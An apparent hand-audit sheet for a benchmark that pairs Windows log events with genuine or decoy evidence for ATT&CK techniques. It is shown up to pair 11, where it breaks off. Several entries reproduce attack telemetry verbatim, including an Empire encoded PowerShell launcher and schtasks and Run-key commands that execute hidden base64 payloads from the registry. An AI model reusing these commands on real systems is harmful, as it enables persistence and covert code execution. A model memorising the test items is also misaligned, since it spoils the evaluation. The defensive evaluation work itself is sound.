# Stage 3 evidence: hand audit (20 pairs, v3)

For each pair, check the boxes and add a note. The original event is shown as the baseline saw it; the evidence is exactly the text the model will receive under 'Additional evidence'. Neutral pairs carry no evidence and are not included.

| # | technique | condition | link | evidence Event ID | same channel | flags |
|---|---|---|---|---|---|---|
| 1 | T1003.001 | genuine | guid | 11 | yes |  |
| 2 | T1003.001 | misleading |  | 4662 | no |  |
| 3 | T1003.006 | genuine | time | 11 | no |  |
| 4 | T1003.006 | misleading |  | 10 | no | names: PowerShell |
| 5 | T1021.002 | genuine | time | 4624 | no |  |
| 6 | T1053.005 | genuine | pid | 4688 | no | names: PowerShell |
| 7 | T1053.005 | misleading |  | 13 | yes | names: PowerShell |
| 8 | T1055 | genuine | guid | 1 | yes |  |
| 9 | T1055 | misleading |  | 12 | yes |  |
| 10 | T1059.001 | genuine | pid | 4103 | yes | names: PowerShell |
| 11 | T1059.001 | misleading |  | 1 | no |  |
| 12 | T1059.003 | genuine | pid | 4688 | no |  |
| 13 | T1059.003 | misleading |  | 4104 | no | names: PowerShell |
| 14 | T1546.003 | genuine | time | 19 | yes | evidence is a T1546.003 pool event |
| 15 | T1546.003 | misleading |  | 1 | yes | names: PowerShell |
| 16 | T1547.001 | genuine | guid | 11 | yes |  |
| 17 | T1547.001 | misleading |  | 19 | yes |  |
| 18 | T1562.002 | genuine | guid | 3 | yes |  |
| 19 | T1562.002 | misleading |  | 8 | yes |  |
| 20 | T1003.006 | misleading |  | 10 | no | names: PowerShell |

---

## 1. T1003.001, genuine

- pair: `15a2624605c9e3d3|genuine`  (cluster `T1003.001|rdp_interactive_taskmanager_lsass_dump_2020-09-22043748.json|2020-09-22 08:38`)
- baseline correct on this event: True
- original Event ID 10, channel `Microsoft-Windows-Sysmon/Operational`; evidence Event ID 11, channel `Microsoft-Windows-Sysmon/Operational`; same channel: True
- link: **guid**, |dt| = 0.0 s; raw file `rdp_interactive_taskmanager_lsass_dump_2020-09-22043748.json`, index 3962
- fields removed or masked: ProcessGuid, EventTime, CreationUtcTime, UtcTime, Hostname
- technique names in evidence text: none; automatic leak check: clean

**Original event**

```text
SourceImage: C:\windows\system32\taskmgr.exe
EventID: 10
Channel: Microsoft-Windows-Sysmon/Operational
AccountType: User
UserID: S-1-5-18
SourceProcessGUID: {b34bc01c-b7f3-5f69-df02-000000000900}
TargetImage: C:\windows\system32\lsass.exe
GrantedAccess: 0x1410
EventTime: 2020-09-22 04:38:12
AccountName: SYSTEM
SourceProcessId: 624
SourceThreadId: 5452
Domain: NT AUTHORITY
TargetProcessGUID: {b34bc01c-226a-5f69-0c00-000000000900}
SourceName: Microsoft-Windows-Sysmon
TargetProcessId: 744
Category: Process accessed (rule: ProcessAccess)
CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+305fe|C:\windows\system32\taskmgr.exe+2d95e|C:\windows\system32\taskmgr.exe+79fec|C:\windows\system32\taskmgr.exe+7a709|C:\windows\system32\taskmgr.exe+77a73|C:\windows\system32\taskmgr.exe+76aae|C:\windows\system32\taskmgr.exe+38288|C:\windows\system32\taskmgr.exe+3962d|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
UtcTime: 2020-09-22 08:38:12.637
Hostname: WORKSTATION5.theshire.local
RuleName: -
```

**Evidence (as the model sees it)**

```text
EventID: 11
Channel: Microsoft-Windows-Sysmon/Operational
AccountType: User
UserID: S-1-5-18
TargetFilename: C:\Users\pgustavo\AppData\Local\D3DSCache
AccountName: SYSTEM
Domain: NT AUTHORITY
SourceName: Microsoft-Windows-Sysmon
Image: C:\windows\system32\taskmgr.exe
Category: File created (rule: FileCreate)
RuleName: -
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is really related to the original (same process / same activity)
- [ ] nothing outside the event itself gives the condition away
- notes:


---

## 2. T1003.001, misleading

- pair: `3ed0fd68115b4b4e|misleading`  (cluster `T1003.001|rdp_interactive_taskmanager_lsass_dump_2020-09-22043748.json|2020-09-22 08:38`)
- baseline correct on this event: True
- original Event ID 10, channel `Microsoft-Windows-Sysmon/Operational`; evidence Event ID 4662, channel `Security`; same channel: False
- decoy technique: **T1003.006**; evidence from cluster `T1003.006|covenant_dcsync_dcerpc_drsuapi_DsGetNCChanges_2020-08-05020926.json|2020-08-05 02:10` (event `897e82cd22af2fbd`)
- fields removed or masked: ObjectName (masked), Hostname, EventTime
- technique names in evidence text: none; automatic leak check: clean

**Original event**

```text
SourceImage: C:\windows\system32\taskmgr.exe
EventID: 10
Channel: Microsoft-Windows-Sysmon/Operational
AccountType: User
UserID: S-1-5-18
SourceProcessGUID: {b34bc01c-b7f3-5f69-df02-000000000900}
TargetImage: C:\windows\system32\lsass.exe
GrantedAccess: 0x1fffff
EventTime: 2020-09-22 04:38:27
AccountName: SYSTEM
SourceProcessId: 624
SourceThreadId: 6856
Domain: NT AUTHORITY
TargetProcessGUID: {b34bc01c-226a-5f69-0c00-000000000900}
SourceName: Microsoft-Windows-Sysmon
TargetProcessId: 744
Category: Process accessed (rule: ProcessAccess)
CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\SYSTEM32\ntdll.dll+74ba7|C:\windows\System32\KERNEL32.DLL+1c208|C:\windows\System32\KERNEL32.DLL+23228|C:\windows\system32\dbgcore.DLL+9447|C:\windows\system32\dbgcore.DLL+16185|C:\windows\system32\dbgcore.DLL+100a6|C:\windows\system32\dbgcore.DLL+613f|C:\windows\system32\dbgcore.DLL+6bbc|C:\windows\system32\taskmgr.exe+45e3b|C:\windows\System32\KERNEL32.DLL+17bd4|C:\windows\SYSTEM32\ntdll.dll+6ce51
UtcTime: 2020-09-22 08:38:27.402
Hostname: WORKSTATION5.theshire.local
RuleName: -
```

**Evidence (as the model sees it)**

```text
SubjectUserSid: S-1-5-21-3669966080-2286457517-972388166-1104
ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9}
ObjectName: %[GUID]
AccessList: %%7688
				
AdditionalInfo: -
SourceName: Microsoft-Windows-Security-Auditing
Properties: %%7688
		{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}

SubjectLogonId: 0x824909
Channel: Security
ObjectServer: DS
EventID: 4662
OperationType: Object Access
Category: Directory Service Access
SubjectDomainName: THESHIRE
AccessMask: 0x100
HandleId: 0x0
SubjectUserName: pgustavo
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is a plausible event of the decoy technique
- [ ] nothing outside the event itself gives the condition away
- notes:


---

## 3. T1003.006, genuine

- pair: `f75cb76d84f877ff|genuine`  (cluster `T1003.006|apt29_evals_day1_manual_2020-05-01225525.json|2020-05-01 23:16`)
- baseline correct on this event: True
- original Event ID 4662, channel `Security`; evidence Event ID 11, channel `Microsoft-Windows-Sysmon/Operational`; same channel: False
- link: **time**, |dt| = 5.0 s; raw file `apt29_evals_day1_manual_2020-05-01225525.json`, index 105415
- fields removed or masked: EventTime, UtcTime, ProcessGuid, CreationUtcTime, ProcessId (masked), Hostname
- technique names in evidence text: none; automatic leak check: clean

**Original event**

```text
EventTime: 2020-05-01 23:16:15
EventID: 4662
ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9}
AccessMask: 0x100
Properties: %%7688
		{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}

SourceName: Microsoft-Windows-Security-Auditing
SubjectLogonId: 0x167eda
ObjectServer: DS
HandleId: 0x0
Category: Directory Service Access
AdditionalInfo: -
OperationType: Object Access
SubjectUserSid: S-1-5-18
Channel: Security
SubjectUserName: NEWYORK$
ObjectName: %{11487126-e2dc-4f51-acb1-1b0df0573bb5}
SubjectDomainName: DMEVALS
Hostname: NEWYORK.dmevals.local
AccessList: %%7688
				
```

**Evidence (as the model sees it)**

```text
TargetFilename: C:\Windows\ServiceState\EventLog\Data\lastalive1.dat
EventID: 11
SourceName: Microsoft-Windows-Sysmon
AccountType: User
Domain: NT AUTHORITY
Channel: Microsoft-Windows-Sysmon/Operational
AccountName: SYSTEM
Image: C:\windows\System32\svchost.exe
UserID: S-1-5-18
ProcessId: [PID]
RuleName: -
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is really related to the original (same process / same activity)
- [ ] nothing outside the event itself gives the condition away
- notes:


---

## 4. T1003.006, misleading

- pair: `897e82cd22af2fbd|misleading`  (cluster `T1003.006|covenant_dcsync_dcerpc_drsuapi_DsGetNCChanges_2020-08-05020926.json|2020-08-05 02:10`)
- baseline correct on this event: True
- original Event ID 4662, channel `Security`; evidence Event ID 10, channel `Microsoft-Windows-Sysmon/Operational`; same channel: False
- decoy technique: **T1003.001**; evidence from cluster `T1003.001|empire_mimikatz_lsadump_patch_2020-08-07103913.json|2020-08-07 14:39` (event `3e74cf0cc7262865`)
- fields removed or masked: TargetProcessGUID, EventTime, SourceProcessGUID, Hostname, ProcessId (masked), UtcTime, SourceProcessId (masked), SourceThreadId (masked), TargetProcessId (masked)
- technique names in evidence text: PowerShell; automatic leak check: clean

**Original event**

```text
SubjectUserSid: S-1-5-21-3669966080-2286457517-972388166-1104
ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9}
ObjectName: %{3933c65d-ac7f-4c79-b5b7-ad0fb941333c}
AccessList: %%7688

				
AdditionalInfo: -
SourceName: Microsoft-Windows-Security-Auditing
Properties: %%7688

		{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}

	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


SubjectLogonId: 0x824909
Channel: Security
ObjectServer: DS
EventID: 4662
OperationType: Object Access
Hostname: MORDORDC.theshire.local
Category: Directory Service Access
SubjectDomainName: THESHIRE
AccessMask: 0x100
HandleId: 0x0
EventTime: 2020-08-05 02:10:02
SubjectUserName: pgustavo
```

**Evidence (as the model sees it)**

```text
AccountType: User
CallTrace: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+2726e|UNKNOWN(000002EE3192B4AD)
Channel: Microsoft-Windows-Sysmon/Operational
SourceName: Microsoft-Windows-Sysmon
ProcessId: [PID]
SourceImage: C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
AccountName: SYSTEM
GrantedAccess: 0x1438
Domain: NT AUTHORITY
SourceProcessId: [PID]
SourceThreadId: [TID]
TargetProcessId: [PID]
EventID: 10
UserID: S-1-5-18
TargetImage: C:\windows\system32\lsass.exe
RuleName: -
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is a plausible event of the decoy technique
- [ ] nothing outside the event itself gives the condition away
- notes: OK. Strong decoy. PowerShell opens lsass with access 0x1438 and the call trace ends in unbacked memory, typical of in-memory credential dumping. “PowerShell” appears only in the image path, which is genuine log content. Note the asymmetry with pair 2: the same decoy pair is strong in this direction but weakened by GUID masking in the other.


---

## 5. T1021.002, genuine

- pair: `dd416057eacf63a0|genuine`  (cluster `T1021.002|covenant_sharpsc_create_dcerpc_smb_svcctl_2020-08-06022635.json|2020-08-06 02:27`)
- baseline correct on this event: True
- original Event ID 7045, channel `System`; evidence Event ID 4624, channel `Security`; same channel: False
- link: **time**, |dt| = 0.0 s; raw file `covenant_sharpsc_create_dcerpc_smb_svcctl_2020-08-06022635.json`, index 1012
- fields removed or masked: Hostname, ProcessId (masked), ActivityID (masked), LogonGuid, WorkstationName, EventTime
- technique names in evidence text: none; automatic leak check: clean

**Original event**

```text
ServiceType: user mode service
EventTime: 2020-08-06 02:27:29
AccountType: User
Channel: System
SourceName: Service Control Manager
Hostname: WORKSTATION6.theshire.local
ServiceName: OTR
AccountName: pgustavo
Domain: THESHIRE
StartType: auto start
EventID: 7045
UserID: S-1-5-21-1363495622-3806888128-621328882-1104
ImagePath: C:\Windows\System32\GruntHTTP2.exe
```

**Evidence (as the model sees it)**

```text
TargetDomainName: THESHIRE.LOCAL
ElevatedToken: %%1842
Channel: Security
SubjectDomainName: -
Category: Logon
ProcessId: [PID]
TargetOutboundDomainName: -
IpPort: 54736
ImpersonationLevel: %%1833
ProcessName: -
KeyLength: 0
TargetOutboundUserName: -
SubjectUserName: -
RestrictedAdminMode: -
ActivityID: [GUID]
LogonProcessName: Kerberos
SubjectLogonId: 0x0
TargetLinkedLogonId: 0x0
SourceName: Microsoft-Windows-Security-Auditing
TargetLogonId: 0xba93e3
TargetUserSid: S-1-5-21-1363495622-3806888128-621328882-1104
TransmittedServices: -
IpAddress: 172.18.39.5
LmPackageName: -
SubjectUserSid: S-1-0-0
TargetUserName: pgustavo
EventID: 4624
AuthenticationPackageName: Kerberos
VirtualAccount: %%1843
LogonType: 3
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is really related to the original (same process / same activity)
- [ ] nothing outside the event itself gives the condition away
- notes: OK. Strong evidence despite the time link. A network logon (type 3) by the same user, with the same SID, in the same second as the service install, which is the step before remote service creation. The user name, SID and source IP are not masked. They are real evidence, but genuine pairs may share them with the original more often than misleading pairs, which could hint at the condition. To be counted after the audit.


---

## 6. T1053.005, genuine

- pair: `0793212750e00b04|genuine`  (cluster `T1053.005|schtask_create_2020-12-1907003032.json|2020-12-19 12:00`)
- baseline correct on this event: True
- original Event ID 1, channel `Microsoft-Windows-Sysmon/Operational`; evidence Event ID 4688, channel `Security`; same channel: False
- link: **pid**, |dt| = 0.015 s; raw file `schtask_create_2020-12-1907003032.json`, index 59
- fields removed or masked: Hostname, TimeCreated, NewProcessId (masked), ProcessId (masked), CommandLine (masked)
- technique names in evidence text: PowerShell; automatic leak check: clean

**Original event**

```text
SourceName: Microsoft-Windows-Sysmon
Channel: Microsoft-Windows-Sysmon/Operational
Hostname: WORKSTATION5.theshire.local
TimeCreated: 2020-12-19T07:00:22.191Z
EventID: 1
RuleName: -
UtcTime: 2020-12-19 12:00:22.190
ProcessGuid: {67e11d8c-eb56-5fdd-2097-000000000700}
ProcessId: 8920
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.18362.1237 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /create /F /tn \Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager /tr "C:\Windows\system32\cmd.exe /C C:\Windows\System32\notepad.exe" /sc ONSTART /ru system /S WORKSTATION6
CurrentDirectory: C:\windows\system32\
User: THESHIRE\pgustavo
LogonGuid: {67e11d8c-77f2-5fd2-2e39-4f0100000000}
LogonId: 0x14f392e
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=912BA122331D7BA3DBA56868AD3CFA3C11C1D63E,MD5=A50ADB3775DB1BF3BC77CC598F68B57D,SHA256=52E53619604DE033B4CE2A82BDF59AC10732AE1DC3D8EE026EAD8BA84890A944,IMPHASH=BA9DA670C0D807BB93D0F91006DC0CA4
ParentProcessGuid: {67e11d8c-eb56-5fdd-1f97-000000000700}
ParentProcessId: 460
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe" /C schtasks /create /F /tn \Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager /tr "C:\Windows\system32\cmd.exe /C C:\Windows\System32\notepad.exe" /sc ONSTART /ru system /S WORKSTATION6
```

**Evidence (as the model sees it)**

```text
SourceName: Microsoft-Windows-Security-Auditing
Channel: Security
EventID: 4688
SubjectUserSid: S-1-5-21-3786818125-2382361537-3207726629-1104
SubjectUserName: pgustavo
SubjectDomainName: THESHIRE
SubjectLogonId: 0x14f392e
NewProcessId: [PID]
NewProcessName: C:\Windows\System32\cmd.exe
TokenElevationType: %%1937
ProcessId: [PID]
CommandLine: "C:\Windows\system32\cmd.exe" /C schtasks /create /F /tn \Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager /tr "C:\Windows\system32\cmd.exe /C C:\Windows\System32\notepad.exe" /sc ONSTART /ru system /S [HOST]
TargetUserSid: S-1-0-0
TargetUserName: -
TargetDomainName: -
TargetLogonId: 0x0
ParentProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
MandatoryLabel: S-1-16-12288
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is really related to the original (same process / same activity)
- [ ] nothing outside the event itself gives the condition away
- notes:


---

## 7. T1053.005, misleading

- pair: `b7d819458bfa1246|misleading`  (cluster `T1053.005|empire_schtasks_creation_execution_elevated_user_2020-09-21175806.json|2020-09-21 21:58`)
- baseline correct on this event: True
- original Event ID 1, channel `Microsoft-Windows-Sysmon/Operational`; evidence Event ID 13, channel `Microsoft-Windows-Sysmon/Operational`; same channel: True
- decoy technique: **T1547.001**; evidence from cluster `T1547.001|empire_persistence_registry_modification_run_keys_standard_user_2020-09-04030609.json|2020-09-04 07:06` (event `2a127f68cdc4410d`)
- fields removed or masked: Hostname, ProcessId (masked), ProcessGuid, UtcTime, EventTime
- technique names in evidence text: PowerShell; automatic leak check: clean

**Original event**

```text
EventID: 1
Channel: Microsoft-Windows-Sysmon/Operational
AccountType: User
ProcessGuid: {b34bc01c-21f9-5f69-1701-000000000800}
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
LogonGuid: {b34bc01c-1fab-5f69-791d-0a0000000000}
EventTime: 2020-09-21 17:58:17
AccountName: SYSTEM
CommandLine: "C:\windows\system32\schtasks.exe" /Create /F /RU system /SC ONLOGON /TN MordorElevated /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""
Domain: NT AUTHORITY
User: THESHIRE\pgustavo
Hashes: SHA1=2CA6101525953606730412294C36D415FEE06B18,MD5=003D681048A63B9862C299F30492CFDF,SHA256=D3222E48A036C6C730BB4E67B4C02E83C87860701975F408E5BF708B4B9CDBF4,IMPHASH=E59000FC08C43F1D70C9403E04909313
SourceName: Microsoft-Windows-Sysmon
CurrentDirectory: C:\windows\system32\
Description: Task Scheduler Configuration Tool
Category: Process Create (rule: ProcessCreate)
Company: Microsoft Corporation
FileVersion: 10.0.18362.175 (WinBuild.160101.0800)
IntegrityLevel: High
UserID: S-1-5-18
TerminalSessionId: 2
ParentProcessGuid: {b34bc01c-20ca-5f69-0c01-000000000800}
ParentCommandLine: "C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBJAE8ATgBUAEEAQgBsAGUALgBQAFMAVgBFAHIAcwBpAE8ATgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJABjADMAMgAyAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIAbABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAGMAMwAyADIAKQB7ACQAQwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBMAFUAZQAoACQATgB1AGwAbAApADsASQBGACgAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBBAEwAPQBbAEMATwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcARQBuAGUAUgBpAGMALgBEAEkAYwBUAEkAbwBuAEEAUgB5AFsAcwB0AFIAaQBuAEcALABTAFkAcwBUAGUAbQAuAE8AYgBqAGUAYwB0AF0AXQA6ADo
... [4120 more characters not shown here; the model sees all of them]
```

**Evidence (as the model sees it)**

```text
AccountType: User
Domain: NT AUTHORITY
UserID: S-1-5-18
SourceName: Microsoft-Windows-Sysmon
AccountName: SYSTEM
EventID: 13
ProcessId: [PID]
Category: Registry value set (rule: RegistryEvent)
Channel: Microsoft-Windows-Sysmon/Operational
Details: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"
EventTypeOrignal: INFO
RuleName: -
Image: C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3125456671-949036322-3048627137-1104\Software\Microsoft\Windows\CurrentVersion\Run\Updater
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is a plausible event of the decoy technique
- [ ] nothing outside the event itself gives the condition away
- notes: OK. Strong and plausible decoy. A Run key value set by PowerShell that loads a hidden payload from the registry, the same Empire pattern as the original scheduled task, which also reads its payload from the registry. Same channel and the same SYSTEM account, so nothing gives the condition away.


---

## 8. T1055, genuine

- pair: `0f4f8762226edc55|genuine`  (cluster `T1055|covenant_lolbin_wuauclt_createremotethread_2020-10-12183248.json|2020-10-12 22:34`)
- baseline correct on this event: True
- original Event ID 8, channel `Microsoft-Windows-Sysmon/Operational`; evidence Event ID 1, channel `Microsoft-Windows-Sysmon/Operational`; same channel: True
- link: **guid**, |dt| = 0.0 s; raw file `covenant_lolbin_wuauclt_createremotethread_2020-10-12183248.json`, index 593
- fields removed or masked: ParentProcessGuid, ProcessId (masked), Hostname, ParentProcessId (masked), UtcTime, LogonGuid, ProcessGuid, EventTime
- technique names in evidence text: none; automatic leak check: clean

**Original event**

```text
SourceProcessId: 6208
RuleName: -
StartAddress: 0x000001E811820000
Channel: Microsoft-Windows-Sysmon/Operational
UserID: S-1-5-18
TargetProcessId: 2368
TargetImage: &lt;unknown process&gt;
ProcessId: 6208
Hostname: WORKSTATION5.theshire.local
UtcTime: 2020-10-12 22:34:38.169
NewThreadId: 6932
SourceName: Microsoft-Windows-Sysmon
TargetProcessGuid: {71b87c12-d9fe-5f84-1a01-000000000500}
EventID: 8
Domain: NT AUTHORITY
Category: CreateRemoteThread detected (rule: CreateRemoteThread)
SourceProcessGuid: {71b87c12-d9fe-5f84-1901-000000000500}
AccountName: SYSTEM
StartFunction: -
SourceImage: C:\Windows\System32\wuauclt.exe
StartModule: -
EventTime: 2020-10-12 18:34:38
AccountType: User
```

**Evidence (as the model sees it)**

```text
RuleName: -
Channel: Microsoft-Windows-Sysmon/Operational
UserID: S-1-5-18
Image: C:\Windows\System32\wuauclt.exe
CurrentDirectory: C:\Users\pgustavo\Desktop\
IntegrityLevel: High
ProcessId: [PID]
Company: Microsoft Corporation
Description: Windows Update
ParentProcessId: [PID]
TerminalSessionId: 2
SourceName: Microsoft-Windows-Sysmon
Product: Microsoft® Windows® Operating System
User: THESHIRE\pgustavo
FileVersion: 10.0.18362.1082 (WinBuild.160101.0800)
EventID: 1
Domain: NT AUTHORITY
Category: Process Create (rule: ProcessCreate)
CommandLine: C:\Windows\System32\wuauclt.exe  /UpdateDeploymentProvider C:\ProgramData\SimpleInjection.dll /RunHandlerComServer
LogonId: 0x163d26
OriginalFileName: wuauclt.exe
AccountName: SYSTEM
Hashes: SHA1=2F40F94E713BC7D5759B15A15A2877014E27C05C,MD5=66A49AF6FA9EBC17ACF17313D0DE25E1,SHA256=A039511A553F9DA172468D4A0EB4552212A88AB9F0D0EE18CFEE7DDF2E2A9A2C,IMPHASH=BE9B473C189DDACB39D5DEE749A544E5
ParentImage: C:\Windows\System32\cmd.exe
AccountType: User
ParentCommandLine: "cmd.exe" /c C:\Windows\System32\wuauclt.exe /UpdateDeploymentProvider C:\ProgramData\SimpleInjection.dll /RunHandlerComServer
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is really related to the original (same process / same activity)
- [ ] nothing outside the event itself gives the condition away
- notes: OK. Good evidence. It is the creation of the same process that created the remote thread (GUID link, 0 s), showing wuauclt.exe loading a DLL from ProgramData through /UpdateDeploymentProvider, a known way to run code through a signed Windows binary. The DLL name SimpleInjection.dll nearly spells out the technique. It is genuine lab content and points to the correct label, but it makes the evidence easier than in real data and may raise the model’s confidence.


---

## 9. T1055, misleading

- pair: `0f4f8762226edc55|misleading`  (cluster `T1055|covenant_lolbin_wuauclt_createremotethread_2020-10-12183248.json|2020-10-12 22:34`)
- baseline correct on this event: True
- original Event ID 8, channel `Microsoft-Windows-Sysmon/Operational`; evidence Event ID 12, channel `Microsoft-Windows-Sysmon/Operational`; same channel: True
- decoy technique: **T1562.002**; evidence from cluster `T1562.002|reg_stop_event_logging_controlset001_minint_key.json|2022-08-03 23:18` (event `8e494319f9c4cb22`)
- fields removed or masked: Hostname, TimeCreated, UtcTime, ProcessGuid, ProcessId (masked), User (masked)
- technique names in evidence text: none; automatic leak check: clean

**Original event**

```text
SourceProcessId: 6208
RuleName: -
StartAddress: 0x000001E811820000
Channel: Microsoft-Windows-Sysmon/Operational
UserID: S-1-5-18
TargetProcessId: 2368
TargetImage: &lt;unknown process&gt;
ProcessId: 6208
Hostname: WORKSTATION5.theshire.local
UtcTime: 2020-10-12 22:34:38.169
NewThreadId: 6932
SourceName: Microsoft-Windows-Sysmon
TargetProcessGuid: {71b87c12-d9fe-5f84-1a01-000000000500}
EventID: 8
Domain: NT AUTHORITY
Category: CreateRemoteThread detected (rule: CreateRemoteThread)
SourceProcessGuid: {71b87c12-d9fe-5f84-1901-000000000500}
AccountName: SYSTEM
StartFunction: -
SourceImage: C:\Windows\System32\wuauclt.exe
StartModule: -
EventTime: 2020-10-12 18:34:38
AccountType: User
```

**Evidence (as the model sees it)**

```text
SourceName: Microsoft-Windows-Sysmon
Channel: Microsoft-Windows-Sysmon/Operational
EventID: 12
RuleName: -
ProcessId: [PID]
Image: C:\Users\IT01-Pedro\Downloads\payload.exe
TargetObject: HKLM\System\CurrentControlSet\Control\MiniNt
User: [HOST]\pedro
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is a plausible event of the decoy technique
- [ ] nothing outside the event itself gives the condition away
- notes: OK. Valid decoy. Creating the MiniNt key makes Windows behave as if it runs in WinPE, which stops event logging, a known way to disable the event log. The user path IT01-Pedro and the user pedro come from a different lab environment than the original (WORKSTATION5, THESHIRE), and the image is named payload.exe. A careful model may see that the evidence comes from elsewhere, which would make it less misleading.


---

## 10. T1059.001, genuine

- pair: `40711ea61d05c1b0|genuine`  (cluster `T1059.001|apt29_evals_day1_manual_2020-05-01225525.json|2020-05-01 23:00`)
- baseline correct on this event: True
- original Event ID 4104, channel `Microsoft-Windows-PowerShell/Operational`; evidence Event ID 4103, channel `Microsoft-Windows-PowerShell/Operational`; same channel: True
- link: **pid**, |dt| = 0.0 s; raw file `apt29_evals_day1_manual_2020-05-01225525.json`, index 33314
- fields removed or masked: EventTime, ContextInfo (masked), ActivityID (masked), Hostname
- technique names in evidence text: PowerShell; automatic leak check: clean

**Original event**

```text
EventTime: 2020-05-01 23:00:48
EventID: 4104
SourceName: Microsoft-Windows-PowerShell
AccountType: User
ScriptBlockText: cd "C:\Program Files\SysinternalsSuite\"
Domain: DMEVALS
ActivityID: {BCCD0404-4290-0001-6BE3-12D71F20D601}
Category: Execute a Remote Command
MessageNumber: 1
Channel: Microsoft-Windows-PowerShell/Operational
AccountName: pbeesly
MessageTotal: 1
UserID: S-1-5-21-1830255721-3727074217-2423397540-1107
ScriptBlockId: ecdb003d-8e22-4d61-8534-e65d6ddb3c01
Hostname: SCRANTON.dmevals.local
```

**Evidence (as the model sees it)**

```text
EventID: 4103
Payload: CommandInvocation(Out-Default): "Out-Default"

SourceName: Microsoft-Windows-PowerShell
AccountType: User
ContextInfo:         Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.18362.628
        Host ID = [GUID]
        Host Application = powershell.exe
        Engine Version = 5.1.18362.628
        Runspace ID = [GUID]
        Pipeline ID = 20
        Command Name = 
        Command Type = Script
        Script Name = 
        Command Path = 
        Sequence Number = 3792
        User = DMEVALS\pbeesly
        Connected User = 
        Shell ID = Microsoft.PowerShell

Domain: DMEVALS
ActivityID: [GUID]
Category: Executing Pipeline
Channel: Microsoft-Windows-PowerShell/Operational
AccountName: pbeesly
UserID: S-1-5-21-1830255721-3727074217-2423397540-1107
```

- [ ] no host name, timestamp or GUID left
- [ ] no technique ID, name or description added
- [ ] evidence is really related to the original (same process / same activity)
- [ ] nothing outside the event itself gives the condition away
- notes:


---

## 11. T1059.001, misleading

- pair: `40711ea61d05c1b0|misleading`  (cluster `T1059.001|apt29_evals_day1_manual_2020-05-01225525.json|2020-05-01 23:00`)
- baseline correct on this event: True
